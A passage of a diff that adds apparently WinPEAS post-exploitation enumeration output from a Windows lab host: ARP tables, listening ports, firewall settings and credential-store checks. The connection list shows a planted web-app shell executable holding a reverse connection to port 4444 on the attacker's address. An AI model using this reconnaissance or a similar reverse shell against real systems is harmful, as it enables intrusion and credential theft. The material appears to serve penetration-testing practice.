+          10.129.125.190        00-50-56-B9-BA-16     Dynamic
+          10.129.125.191        00-50-56-B9-79-8E     Dynamic
+          10.129.125.192        00-50-56-B9-90-CA     Dynamic
+          10.129.125.193        00-50-56-B9-69-01     Dynamic
+          10.129.125.194        00-50-56-B9-76-A2     Dynamic
+          10.129.125.195        00-50-56-B9-77-B8     Dynamic
+          10.129.125.196        00-50-56-B9-C7-8E     Dynamic
+          10.129.125.197        00-50-56-B9-93-C3     Dynamic
+          10.129.125.198        00-50-56-B9-03-A9     Dynamic
+          10.129.125.199        00-50-56-B9-D5-98     Dynamic
+          10.129.125.200        00-50-56-B9-40-43     Dynamic
+          10.129.125.201        00-50-56-B9-27-58     Dynamic
+          10.129.125.202        00-50-56-B9-64-55     Dynamic
+          10.129.125.203        00-50-56-B9-8C-12     Dynamic
+          10.129.125.204        00-50-56-B9-3B-7D     Dynamic
+          10.129.125.205        00-50-56-B9-6F-D0     Dynamic
+          10.129.125.206        00-50-56-B9-F2-D1     Dynamic
+          10.129.125.207        00-50-56-B9-AB-D3     Dynamic
+          10.129.125.208        00-50-56-B9-BB-0D     Dynamic
+          10.129.125.209        00-50-56-B9-71-65     Dynamic
+          10.129.125.210        00-50-56-B9-FA-CA     Dynamic
+          10.129.125.211        00-50-56-B9-9B-24     Dynamic
+          10.129.125.212        00-50-56-B9-3C-B8     Dynamic
+          10.129.125.213        00-50-56-B9-09-60     Dynamic
+          10.129.125.214        00-50-56-B9-64-8F     Dynamic
+          10.129.125.215        00-50-56-B9-91-DE     Dynamic
+          10.129.125.216        00-50-56-B9-BE-CC     Dynamic
+          10.129.125.217        00-50-56-B9-EA-8A     Dynamic
+          10.129.125.218        00-50-56-B9-F5-EF     Dynamic
+          10.129.125.219        00-50-56-B9-E0-EC     Dynamic
+          10.129.125.220        00-50-56-B9-A4-EF     Dynamic
+          10.129.125.221        00-50-56-B9-BF-30     Dynamic
+          10.129.125.222        00-50-56-B9-FF-DB     Dynamic
+          10.129.125.223        00-50-56-B9-BF-24     Dynamic
+          10.129.125.224        00-50-56-B9-99-BF     Dynamic
+          10.129.125.225        00-50-56-B9-28-3E     Dynamic
+          10.129.125.226        00-50-56-B9-9B-61     Dynamic
+          10.129.125.227        00-50-56-B9-3E-9D     Dynamic
+          10.129.125.228        00-50-56-B9-0E-48     Dynamic
+          10.129.125.229        00-50-56-B9-B6-22     Dynamic
+          10.129.125.230        00-50-56-B9-32-18     Dynamic
+          10.129.125.231        00-50-56-B9-EF-B1     Dynamic
+          10.129.125.232        00-50-56-B9-B4-B8     Dynamic
+          10.129.125.233        00-50-56-B9-C8-B5     Dynamic
+          10.129.125.234        00-50-56-B9-B4-6C     Dynamic
+          10.129.125.235        00-50-56-B9-39-8E     Dynamic
+          10.129.125.236        00-50-56-B9-10-4B     Dynamic
+          10.129.125.237        00-50-56-B9-C1-02     Invalid
+          10.129.125.238        00-50-56-B9-99-FE     Dynamic
+          10.129.125.239        00-50-56-B9-86-9D     Dynamic
+          10.129.125.240        00-50-56-B9-9E-16     Dynamic
+          10.129.125.241        00-50-56-B9-F8-25     Dynamic
+          10.129.125.242        00-50-56-B9-43-11     Dynamic
+          10.129.125.243        00-50-56-B9-78-F3     Dynamic
+          10.129.125.244        00-50-56-B9-3E-2F     Dynamic
+          10.129.125.245        00-50-56-B9-2F-64     Dynamic
+          10.129.125.246        00-50-56-B9-2B-79     Dynamic
+          10.129.125.247        00-50-56-B9-E6-AB     Dynamic
+          10.129.125.248        00-50-56-B9-5A-B4     Dynamic
+          10.129.125.249        00-50-56-B9-88-4E     Dynamic
+          10.129.125.250        00-50-56-B9-02-7C     Dynamic
+          10.129.125.251        00-50-56-B9-00-52     Dynamic
+          10.129.125.252        00-50-56-B9-DB-D9     Dynamic
+          10.129.125.253        00-50-56-B9-B1-CA     Dynamic
+          10.129.125.254        00-50-56-B9-45-9B     Dynamic
+          10.129.125.255        00-50-56-B9-64-35     Dynamic
+          10.129.126.0          00-50-56-B9-43-9F     Dynamic
+          10.129.126.1          00-50-56-B9-E6-83     Dynamic
+          10.129.126.2          00-50-56-B9-6A-D1     Dynamic
+          10.129.126.3          00-50-56-B9-4F-73     Dynamic
+          10.129.126.4          00-50-56-B9-D2-EF     Dynamic
+          10.129.126.5          00-50-56-B9-CA-6A     Dynamic
+          10.129.126.6          00-50-56-B9-E4-EB     Dynamic
+          10.129.126.7          00-50-56-B9-5B-83     Dynamic
+          10.129.126.8          00-50-56-B9-A9-90     Dynamic
+          10.129.126.9          00-50-56-B9-FB-88     Dynamic
+          10.129.126.10         00-50-56-B9-6E-25     Dynamic
+          10.129.126.11         00-50-56-B9-BC-42     Dynamic
+          10.129.126.12         00-50-56-B9-17-3D     Dynamic
+          10.129.126.13         00-50-56-B9-16-0A     Dynamic
+          10.129.126.14         00-50-56-B9-BF-79     Dynamic
+          10.129.126.15         00-50-56-B9-21-42     Dynamic
+          10.129.126.16         00-50-56-B9-2A-A0     Dynamic
+          10.129.126.17         00-50-56-B9-D3-1C     Dynamic
+          10.129.126.18         00-50-56-B9-D0-6A     Dynamic
+          10.129.126.19         00-50-56-B9-DD-FD     Dynamic
+          10.129.126.20         00-50-56-B9-A8-68     Dynamic
+          10.129.126.21         00-50-56-B9-19-77     Dynamic
+          10.129.126.22         00-50-56-B9-9C-E4     Dynamic
+          10.129.126.23         00-50-56-B9-94-74     Dynamic
+          10.129.126.24         00-50-56-B9-4C-84     Dynamic
+          10.129.126.25         00-50-56-B9-DA-B5     Dynamic
+          10.129.126.26         00-50-56-B9-98-9F     Dynamic
+          10.129.126.27         00-50-56-B9-9A-87     Dynamic
+          10.129.126.28         00-50-56-B9-72-7C     Dynamic
+          10.129.126.29         00-50-56-B9-FA-20     Dynamic
+          10.129.126.30         00-50-56-B9-02-77     Dynamic
+          10.129.126.31         00-50-56-B9-58-56     Dynamic
+          10.129.126.32         00-50-56-B9-45-15     Invalid
+          10.129.126.33         00-50-56-B9-46-5A     Dynamic
+          10.129.126.34         00-50-56-B9-9D-7D     Dynamic
+          10.129.126.35         00-50-56-B9-AE-81     Dynamic
+          10.129.126.36         00-50-56-B9-37-96     Dynamic
+          10.129.126.37         00-50-56-B9-F3-6C     Dynamic
+          10.129.126.38         00-50-56-B9-FA-88     Dynamic
+          10.129.126.39         00-50-56-B9-FE-28     Dynamic
+          10.129.126.40         00-50-56-B9-C8-55     Dynamic
+          10.129.126.41         00-50-56-B9-10-39     Dynamic
+          10.129.126.42         00-50-56-B9-E7-3A     Dynamic
+          10.129.126.43         00-50-56-B9-4C-40     Dynamic
+          10.129.126.44         00-50-56-B9-8D-E5     Dynamic
+          10.129.126.45         00-50-56-B9-6E-A6     Dynamic
+          10.129.126.46         00-50-56-B9-7E-88     Dynamic
+          10.129.126.47         00-50-56-B9-41-3F     Dynamic
+          10.129.126.48         00-50-56-B9-D7-AD     Dynamic
+          10.129.126.49         00-50-56-B9-16-96     Dynamic
+          10.129.126.50         00-50-56-B9-DB-2A     Dynamic
+          10.129.126.51         00-50-56-B9-FC-81     Dynamic
+          10.129.126.52         00-50-56-B9-74-A3     Dynamic
+          10.129.126.53         00-50-56-B9-4B-9A     Dynamic
+          10.129.126.54         00-50-56-B9-6F-B7     Dynamic
+          10.129.126.55         00-50-56-B9-58-A0     Dynamic
+          10.129.126.56         00-50-56-B9-1E-DC     Dynamic
+          10.129.126.57         00-50-56-B9-07-7F     Dynamic
+          10.129.126.58         00-50-56-B9-22-2F     Dynamic
+          10.129.126.59         00-50-56-B9-0F-82     Dynamic
+          10.129.126.60         00-50-56-B9-10-63     Dynamic
+          10.129.126.61         00-50-56-B9-82-16     Dynamic
+          10.129.126.62         00-50-56-B9-62-10     Dynamic
+          10.129.255.255        FF-FF-FF-FF-FF-FF     Static
+          169.254.0.218         00-50-56-B9-A4-EF     Dynamic
+          169.254.2.22          00-50-56-B9-62-10     Dynamic
+          169.254.2.165         00-50-56-B9-BE-F4     Dynamic
+          169.254.4.132         00-50-56-B9-42-AC     Dynamic
+          169.254.4.224         00-50-56-B9-77-B8     Dynamic
+          169.254.5.122         00-50-56-B9-03-A9     Dynamic
+          169.254.5.186         00-50-56-B9-F0-F8     Dynamic
+          169.254.5.210         00-50-56-B9-86-9D     Dynamic
+          169.254.7.48          00-50-56-B9-DD-FD     Dynamic
+          169.254.7.84          00-50-56-B9-F8-25     Dynamic
+          169.254.7.172         00-50-56-B9-46-4B     Dynamic
+          169.254.8.155         00-50-56-B9-18-C8     Dynamic
+          169.254.9.132         00-50-56-B9-6F-B7     Dynamic
+          169.254.9.184         00-50-56-B9-10-39     Dynamic
+          169.254.10.57         00-50-56-B9-51-6B     Dynamic
+          169.254.11.42         00-50-56-B9-9E-16     Dynamic
+          169.254.11.90         00-50-56-B9-5A-B4     Dynamic
+          169.254.14.12         00-50-56-B9-88-4E     Dynamic
+          169.254.15.254        00-50-56-B9-16-0A     Dynamic
+          169.254.18.81         00-50-56-B9-9B-61     Dynamic
+          169.254.18.95         00-50-56-B9-1E-DC     Dynamic
+          169.254.18.199        00-50-56-B9-02-7C     Dynamic
+          169.254.19.167        00-50-56-B9-FA-2E     Dynamic
+          169.254.19.237        00-50-56-B9-6A-D1     Dynamic
+          169.254.20.5          00-50-56-B9-9D-7D     Dynamic
+          169.254.21.6          00-50-56-B9-DA-B5     Dynamic
+          169.254.24.128        00-50-56-B9-D5-98     Dynamic
+          169.254.24.137        00-50-56-B9-8C-12     Dynamic
+          169.254.24.163        00-50-56-B9-F9-48     Dynamic
+          169.254.26.51         00-50-56-B9-FF-DB     Dynamic
+          169.254.27.33         00-50-56-B9-64-35     Dynamic
+          169.254.27.129        00-50-56-B9-E4-EB     Dynamic
+          169.254.27.188        00-50-56-B9-FE-0B     Dynamic
+          169.254.30.150        00-50-56-B9-19-77     Dynamic
+          169.254.31.174        00-50-56-B9-A3-5F     Dynamic
+          169.254.31.178        00-50-56-B9-49-43     Dynamic
+          169.254.32.112        00-50-56-B9-BF-24     Dynamic
+          169.254.33.54         00-50-56-B9-3B-7D     Dynamic
+          169.254.34.115        00-50-56-B9-E0-1F     Dynamic
+          169.254.36.15         00-50-56-B9-F8-2C     Dynamic
+          169.254.38.124        00-50-56-B9-4B-9A     Dynamic
+          169.254.39.72         00-50-56-B9-90-CA     Dynamic
+          169.254.39.133        00-50-56-B9-D0-6A     Dynamic
+          169.254.40.39         00-50-56-B9-F5-EF     Dynamic
+          169.254.41.2          00-50-56-B9-18-F3     Dynamic
+          169.254.42.7          00-50-56-B9-F4-D3     Dynamic
+          169.254.43.59         00-50-56-B9-99-BF     Dynamic
+          169.254.43.187        00-50-56-B9-F2-D1     Dynamic
+          169.254.44.38         00-50-56-B9-9A-4C     Dynamic
+          169.254.44.171        00-50-56-B9-3B-C3     Dynamic
+          169.254.45.123        00-50-56-B9-BF-79     Dynamic
+          169.254.46.117        00-50-56-B9-16-96     Dynamic
+          169.254.49.74         00-50-56-B9-45-9B     Dynamic
+          169.254.52.19         00-50-56-B9-D7-AD     Dynamic
+          169.254.54.17         00-50-56-B9-FE-E1     Dynamic
+          169.254.55.12         00-50-56-B9-0F-95     Dynamic
+          169.254.57.24         00-50-56-B9-2A-A0     Dynamic
+          169.254.58.90         00-50-56-B9-FC-07     Dynamic
+          169.254.59.9          00-50-56-B9-97-A3     Dynamic
+          169.254.59.75         00-50-56-B9-07-7F     Dynamic
+          169.254.60.14         00-50-56-B9-FF-E6     Dynamic
+          169.254.60.232        00-50-56-B9-94-74     Dynamic
+          169.254.61.238        00-50-56-B9-64-55     Dynamic
+          169.254.63.190        00-50-56-B9-62-BE     Dynamic
+          169.254.64.121        00-50-56-B9-02-77     Dynamic
+          169.254.64.124        00-50-56-B9-25-1F     Dynamic
+          169.254.66.163        00-50-56-B9-46-5A     Dynamic
+          169.254.66.193        00-50-56-B9-05-3D     Dynamic
+          169.254.67.13         00-50-56-B9-C9-7D     Dynamic
+          169.254.67.154        00-50-56-B9-2B-79     Dynamic
+          169.254.67.253        00-50-56-B9-BD-CA     Dynamic
+          169.254.68.8          00-50-56-B9-F3-B8     Dynamic
+          169.254.71.115        00-50-56-B9-91-DE     Dynamic
+          169.254.71.138        00-50-56-B9-4C-47     Dynamic
+          169.254.72.7          00-50-56-B9-D3-7D     Dynamic
+          169.254.73.5          00-50-56-B9-79-8E     Dynamic
+          169.254.74.227        00-50-56-B9-CE-D4     Dynamic
+          169.254.74.241        00-50-56-B9-27-AC     Dynamic
+          169.254.75.75         00-50-56-B9-C8-55     Dynamic
+          169.254.76.92         00-50-56-B9-59-00     Dynamic
+          169.254.76.109        00-50-56-B9-EA-8A     Dynamic
+          169.254.78.53         00-50-56-B9-10-63     Dynamic
+          169.254.79.27         00-50-56-B9-2F-35     Dynamic
+          169.254.79.141        00-50-56-B9-F4-CA     Dynamic
+          169.254.79.196        00-50-56-B9-0A-0F     Dynamic
+          169.254.80.196        00-50-56-B9-B6-22     Dynamic
+          169.254.81.18         00-50-56-B9-68-FE     Dynamic
+          169.254.81.128        00-50-56-B9-D8-85     Dynamic
+          169.254.81.208        00-50-56-B9-EB-A3     Dynamic
+          169.254.81.216        00-50-56-B9-B5-3C     Dynamic
+          169.254.82.36         00-50-56-B9-B4-B8     Dynamic
+          169.254.82.204        00-50-56-B9-39-47     Dynamic
+          169.254.83.95         00-50-56-B9-90-B0     Dynamic
+          169.254.83.104        00-50-56-B9-76-A2     Dynamic
+          169.254.84.239        00-50-56-B9-14-80     Dynamic
+          169.254.86.148        00-50-56-B9-FA-20     Dynamic
+          169.254.89.139        00-50-56-B9-9F-27     Dynamic
+          169.254.90.44         00-50-56-B9-FC-81     Dynamic
+          169.254.90.146        00-50-56-B9-A6-F6     Dynamic
+          169.254.91.30         00-50-56-B9-37-96     Dynamic
+          169.254.91.240        00-50-56-B9-A8-68     Dynamic
+          169.254.93.100        00-50-56-B9-B1-CA     Dynamic
+          169.254.93.241        00-50-56-B9-FE-28     Dynamic
+          169.254.94.193        00-50-56-B9-D0-47     Dynamic
+          169.254.95.213        00-50-56-B9-6F-D0     Dynamic
+          169.254.96.16         00-50-56-B9-CA-6A     Dynamic
+          169.254.96.94         00-50-56-B9-17-3D     Dynamic
+          169.254.96.170        00-50-56-B9-6E-A6     Dynamic
+          169.254.96.238        00-50-56-B9-78-F3     Dynamic
+          169.254.98.179        00-50-56-B9-D3-1C     Dynamic
+          169.254.98.222        00-50-56-B9-FB-88     Dynamic
+          169.254.100.31        00-50-56-B9-99-FE     Dynamic
+          169.254.100.176       00-50-56-B9-A7-4E     Dynamic
+          169.254.103.36        00-50-56-B9-AB-D3     Dynamic
+          169.254.103.207       00-50-56-B9-2E-8C     Dynamic
+          169.254.103.223       00-50-56-B9-40-43     Dynamic
+          169.254.104.15        00-50-56-B9-08-99     Dynamic
+          169.254.105.237       00-50-56-B9-EF-B1     Dynamic
+          169.254.106.96        00-50-56-B9-C8-B5     Dynamic
+          169.254.107.118       00-50-56-B9-10-76     Dynamic
+          169.254.107.219       00-50-56-B9-43-9F     Dynamic
+          169.254.108.83        00-50-56-B9-EF-9F     Dynamic
+          169.254.109.101       00-50-56-B9-41-3F     Dynamic
+          169.254.109.214       00-50-56-B9-03-FC     Dynamic
+          169.254.110.43        00-50-56-B9-09-BB     Dynamic
+          169.254.114.64        00-50-56-B9-D2-EF     Dynamic
+          169.254.114.81        00-50-56-B9-77-D6     Dynamic
+          169.254.115.38        00-50-56-B9-6E-25     Dynamic
+          169.254.116.22        00-50-56-B9-C6-F7     Dynamic
+          169.254.116.239       00-50-56-B9-F3-6C     Dynamic
+          169.254.117.41        00-50-56-B9-72-7C     Dynamic
+          169.254.117.186       00-50-56-B9-45-15     Dynamic
+          169.254.118.80        00-50-56-B9-E6-AB     Dynamic
+          169.254.120.130       00-50-56-B9-21-42     Dynamic
+          169.254.121.59        00-50-56-B9-43-11     Dynamic
+          169.254.122.232       00-50-56-B9-39-35     Dynamic
+          169.254.124.171       00-50-56-B9-00-52     Dynamic
+          169.254.125.61        00-50-56-B9-27-58     Dynamic
+          169.254.125.115       00-50-56-B9-7F-93     Dynamic
+          169.254.125.250       00-50-56-B9-A9-90     Dynamic
+          169.254.126.12        00-50-56-B9-4D-76     Dynamic
+          169.254.126.67        00-50-56-B9-FA-88     Dynamic
+          169.254.126.184       00-50-56-B9-19-99     Dynamic
+          169.254.126.255       00-50-56-B9-CD-3D     Dynamic
+          169.254.127.55        00-50-56-B9-9B-24     Dynamic
+          169.254.127.226       00-50-56-B9-98-9F     Dynamic
+          169.254.130.30        00-50-56-B9-69-01     Dynamic
+          169.254.130.141       00-50-56-B9-95-D9     Dynamic
+          169.254.132.231       00-50-56-B9-4C-84     Dynamic
+          169.254.133.200       00-50-56-B9-FD-CF     Dynamic
+          169.254.134.93        00-50-56-B9-38-98     Dynamic
+          169.254.134.213       00-50-56-B9-7C-DC     Dynamic
+          169.254.137.162       00-50-56-B9-58-A0     Dynamic
+          169.254.140.99        00-50-56-B9-FC-4A     Dynamic
+          169.254.143.122       00-50-56-B9-22-2F     Dynamic
+          169.254.143.127       00-50-56-B9-C3-95     Dynamic
+          169.254.145.204       00-50-56-B9-58-56     Dynamic
+          169.254.145.243       00-50-56-B9-06-88     Dynamic
+          169.254.148.53        00-50-56-B9-DF-05     Dynamic
+          169.254.149.51        00-50-56-B9-9A-87     Dynamic
+          169.254.149.129       00-50-56-B9-D6-C1     Dynamic
+          169.254.152.177       00-50-56-B9-1C-C2     Dynamic
+          169.254.153.57        00-50-56-B9-13-D2     Dynamic
+          169.254.154.164       00-50-56-B9-31-0C     Dynamic
+          169.254.158.191       00-50-56-B9-28-3E     Dynamic
+          169.254.161.165       00-50-56-B9-9C-E4     Dynamic
+          169.254.162.206       00-50-56-B9-E8-A5     Dynamic
+          169.254.162.215       00-50-56-B9-2B-B7     Dynamic
+          169.254.163.180       00-50-56-B9-2A-14     Dynamic
+          169.254.164.72        00-50-56-B9-1B-C3     Dynamic
+          169.254.165.11        00-50-56-B9-44-04     Dynamic
+          169.254.165.29        00-50-56-B9-71-65     Dynamic
+          169.254.166.23        00-50-56-B9-E7-3A     Dynamic
+          169.254.167.242       00-50-56-B9-BC-42     Dynamic
+          169.254.168.182       00-50-56-B9-4C-40     Dynamic
+          169.254.169.3         00-50-56-B9-10-4B     Dynamic
+          169.254.169.98        00-50-56-B9-4E-AB     Dynamic
+          169.254.170.101       00-50-56-B9-33-4C     Dynamic
+          169.254.170.145       00-50-56-B9-BF-30     Dynamic
+          169.254.170.235       00-50-56-B9-67-96     Dynamic
+          169.254.172.78        00-50-56-B9-AB-15     Dynamic
+          169.254.174.214       00-50-56-B9-BE-5F     Dynamic
+          169.254.176.138       00-50-56-B9-5B-83     Dynamic
+          169.254.176.249       00-50-56-B9-D6-CA     Dynamic
+          169.254.177.44        00-50-56-B9-BB-0D     Dynamic
+          169.254.177.50        00-50-56-B9-FC-C6     Dynamic
+          169.254.177.58        00-50-56-B9-DA-2F     Dynamic
+          169.254.182.221       00-50-56-B9-FA-CA     Dynamic
+          169.254.183.155       00-50-56-B9-4F-73     Dynamic
+          169.254.186.26        00-50-56-B9-B9-B0     Dynamic
+          169.254.186.32        00-50-56-B9-7E-27     Dynamic
+          169.254.186.77        00-50-56-B9-93-C3     Dynamic
+          169.254.188.180       00-50-56-B9-D5-09     Dynamic
+          169.254.188.187       00-50-56-B9-98-D4     Dynamic
+          169.254.188.228       00-50-56-B9-E5-2A     Dynamic
+          169.254.189.48        00-50-56-B9-8B-5E     Dynamic
+          169.254.189.131       00-50-56-B9-D0-0E     Dynamic
+          169.254.192.216       00-50-56-B9-17-2B     Dynamic
+          169.254.196.137       00-50-56-B9-B9-53     Dynamic
+          169.254.197.119       00-50-56-B9-55-04     Dynamic
+          169.254.199.101       00-50-56-B9-82-16     Dynamic
+          169.254.200.138       00-50-56-B9-76-B6     Dynamic
+          169.254.205.23        00-50-56-B9-2F-64     Dynamic
+          169.254.205.43        00-50-56-B9-DB-2A     Dynamic
+          169.254.206.37        00-50-56-B9-9C-AA     Dynamic
+          169.254.207.105       00-50-56-B9-AE-81     Dynamic
+          169.254.208.23        00-50-56-B9-E1-06     Dynamic
+          169.254.210.140       00-50-56-B9-7E-88     Dynamic
+          169.254.211.118       00-50-56-B9-0B-CC     Dynamic
+          169.254.212.144       00-50-56-B9-09-60     Dynamic
+          169.254.213.42        00-50-56-B9-39-8E     Dynamic
+          169.254.213.78        00-50-56-B9-BE-CC     Dynamic
+          169.254.215.69        00-50-56-B9-0F-82     Dynamic
+          169.254.217.131       00-50-56-B9-07-7D     Dynamic
+          169.254.219.83        00-50-56-B9-77-0D     Dynamic
+          169.254.221.134       00-50-56-B9-E6-83     Dynamic
+          169.254.221.213       00-50-56-B9-9F-46     Dynamic
+          169.254.222.105       00-50-56-B9-8D-E5     Dynamic
+          169.254.225.54        00-50-56-B9-C1-02     Dynamic
+          169.254.225.178       00-50-56-B9-E0-EC     Dynamic
+          169.254.226.59        00-50-56-B9-33-78     Dynamic
+          169.254.228.66        00-50-56-B9-3C-B8     Dynamic
+          169.254.228.234       00-50-56-B9-D6-6A     Dynamic
+          169.254.229.118       00-50-56-B9-A4-DD     Dynamic
+          169.254.229.156       00-50-56-B9-BA-16     Dynamic
+          169.254.229.179       00-50-56-B9-5E-62     Dynamic
+          169.254.231.64        00-50-56-B9-56-0A     Dynamic
+          169.254.231.120       00-50-56-B9-C7-8E     Dynamic
+          169.254.231.232       00-50-56-B9-74-A3     Dynamic
+          169.254.233.209       00-50-56-B9-18-FB     Dynamic
+          169.254.236.66        00-50-56-B9-3E-9D     Dynamic
+          169.254.238.37        00-50-56-B9-16-71     Dynamic
+          169.254.239.155       00-50-56-B9-B4-6C     Dynamic
+          169.254.242.72        00-50-56-B9-21-12     Dynamic
+          169.254.242.97        00-50-56-B9-95-E7     Dynamic
+          169.254.243.176       00-50-56-B9-32-18     Dynamic
+          169.254.244.214       00-50-56-B9-DB-D9     Dynamic
+          169.254.245.153       00-50-56-B9-AA-4E     Dynamic
+          169.254.247.249       00-50-56-B9-0E-48     Dynamic
+          169.254.249.19        00-50-56-B9-BB-DB     Dynamic
+          169.254.249.97        00-50-56-B9-D8-44     Dynamic
+          169.254.251.48        00-50-56-B9-A3-79     Dynamic
+          169.254.251.55        00-50-56-B9-84-C9     Dynamic
+          169.254.251.225       00-50-56-B9-ED-44     Dynamic
+          169.254.253.142       00-50-56-B9-63-28     Dynamic
+          169.254.254.31        00-50-56-B9-3E-2F     Dynamic
+          169.254.254.77        00-50-56-B9-FD-DD     Dynamic
+          169.254.254.251       00-50-56-B9-33-CA     Dynamic
+          169.254.255.255       00-00-00-00-00-00     Invalid
+          224.0.0.22            01-00-5E-00-00-16     Static
+          224.0.0.251           01-00-5E-00-00-FB     Static
+          224.0.0.252           01-00-5E-00-00-FC     Static
+
+    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
+        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
+        Known hosts:
+          224.0.0.22            00-00-00-00-00-00     Static
+          239.255.255.250       00-00-00-00-00-00     Static
+
+
+  [+] Current TCP Listening Ports
+   [?] Check for services restricted from the outside 
+  Enumerating IPv4 connections
+
+  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
+
+  TCP        0.0.0.0               80            0.0.0.0               0               Listening         5652            c:\xampp\apache\bin\httpd.exe
+  TCP        0.0.0.0               135           0.0.0.0               0               Listening         916             svchost
+  TCP        0.0.0.0               443           0.0.0.0               0               Listening         5652            c:\xampp\apache\bin\httpd.exe
+  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               3306          0.0.0.0               0               Listening         544             c:\xampp\mysql\bin\mysqld.exe
+  TCP        0.0.0.0               5000          0.0.0.0               0               Listening         5652            c:\xampp\apache\bin\httpd.exe
+  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         4976            svchost
+  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               5986          0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         684             lsass
+  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         520             wininit
+  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1128            svchost
+  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         1480            svchost
+  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         2288            spoolsv
+  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         664             services
+  TCP        0.0.0.0               49670         0.0.0.0               0               Listening         2564            svchost
+  TCP        10.129.125.149        80            10.10.14.7            44136           Established       5652            c:\xampp\apache\bin\httpd.exe
+  TCP        10.129.125.149        139           0.0.0.0               0               Listening         4               System
+  TCP        10.129.125.149        58306         10.10.14.7            4444            Established       2080            C:\xampp\htdocs\omrs\includes\D3fa1t_shell.exe
+
+  Enumerating IPv6 connections
+
+  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name
+
+  TCP        [::]                                        80            [::]                                        0               Listening         5652            c:\xampp\apache\bin\httpd.exe
+  TCP        [::]                                        135           [::]                                        0               Listening         916             svchost
+  TCP        [::]                                        443           [::]                                        0               Listening         5652            c:\xampp\apache\bin\httpd.exe
+  TCP        [::]                                        445           [::]                                        0               Listening         4               System
+  TCP        [::]                                        3306          [::]                                        0               Listening         544             c:\xampp\mysql\bin\mysqld.exe
+  TCP        [::]                                        5000          [::]                                        0               Listening         5652            c:\xampp\apache\bin\httpd.exe
+  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
+  TCP        [::]                                        5986          [::]                                        0               Listening         4               System
+  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
+  TCP        [::]                                        49664         [::]                                        0               Listening         684             lsass
+  TCP        [::]                                        49665         [::]                                        0               Listening         520             wininit
+  TCP        [::]                                        49666         [::]                                        0               Listening         1128            svchost
+  TCP        [::]                                        49667         [::]                                        0               Listening         1480            svchost
+  TCP        [::]                                        49668         [::]                                        0               Listening         2288            spoolsv
+  TCP        [::]                                        49669         [::]                                        0               Listening         664             services
+  TCP        [::]                                        49670         [::]                                        0               Listening         2564            svchost
+
+  [+] Current UDP Listening Ports
+   [?] Check for services restricted from the outside 
+  Enumerating IPv4 connections
+
+  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name
+
+  UDP        0.0.0.0               123           *:*                            2820              svchost
+  UDP        0.0.0.0               500           *:*                            2556              svchost
+  UDP        0.0.0.0               4500          *:*                            2556              svchost
+  UDP        0.0.0.0               5050          *:*                            4976              svchost
+  UDP        0.0.0.0               5353          *:*                            1792              svchost
+  UDP        0.0.0.0               5355          *:*                            1792              svchost
+  UDP        0.0.0.0               59262         *:*                            1792              svchost
+  UDP        0.0.0.0               64535         *:*                            1792              svchost
+  UDP        10.129.125.149        137           *:*                            4                 System
+  UDP        10.129.125.149        138           *:*                            4                 System
+  UDP        10.129.125.149        1900          *:*                            6080              svchost
+  UDP        10.129.125.149        54724         *:*                            6080              svchost
+  UDP        127.0.0.1             1900          *:*                            6080              svchost
+  UDP        127.0.0.1             54725         *:*                            6080              svchost
+  UDP        127.0.0.1             63999         *:*                            3036              svchost
+
+  Enumerating IPv6 connections
+
+  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name
+
+  UDP        [::]                                        123           *:*                            2820              svchost
+  UDP        [::]                                        500           *:*                            2556              svchost
+  UDP        [::]                                        4500          *:*                            2556              svchost
+  UDP        [::]                                        59262         *:*                            1792              svchost
+  UDP        [::]                                        64535         *:*                            1792              svchost
+  UDP        [::1]                                       1900          *:*                            6080              svchost
+  UDP        [::1]                                       54723         *:*                            6080              svchost
+
+  [+] Firewall Rules
+   [?] Showing only DENY rules (too many ALLOW rules always) 
+    Current Profiles: PUBLIC
+    FirewallEnabled (Domain):    True
+    FirewallEnabled (Private):    False
+    FirewallEnabled (Public):    False
+    DENY rules:
+
+  [+] DNS cached --limit 70--
+    Entry                                 Name                                  Data
+
+  [+] Enumerating Internet settings, zone and proxy configuration
+  General Settings
+  Hive        Key                                       Value
+  HKCU        CertificateRevocation                     1
+  HKCU        DisableCachingOfSSLPages                  0
+  HKCU        IE5_UA_Backup_Flag                        5.0
+  HKCU        PrivacyAdvanced                           1
+  HKCU        SecureProtocols                           2688
+  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+  HKCU        ZonesSecurityUpgrade                      System.Byte[]
+  HKCU        WarnonZoneCrossing                        0
+  HKCU        EnableNegotiate                           1
+  HKCU        ProxyEnable                               0
+  HKCU        MigrateProxy                              1
+  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
+  HKLM        CodeBaseSearchPath                        CODEBASE
+  HKLM        EnablePunycode                            1
+  HKLM        MinorVersion                              0
+  HKLM        WarnOnIntranet                            1
+
+  Zone Maps
+  No URLs configured
+
+  Zone Auth Settings
+  No Zone Auth Settings
+
+
+  =========================================(Windows Credentials)=========================================
+
+  [+] Checking Windows Vault
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
+    Not Found
+
+  [+] Checking Credential manager
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
+    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string
+
+
+  [X] Exception: Failed to enumerate credentials
+
+  [+] Saved RDP connections
+    Not Found
+
+  [+] Remote Desktop Server/Client Settings
+  RDP Server Settings
+    Network Level Authentication            :       
+    Block Clipboard Redirection             :       
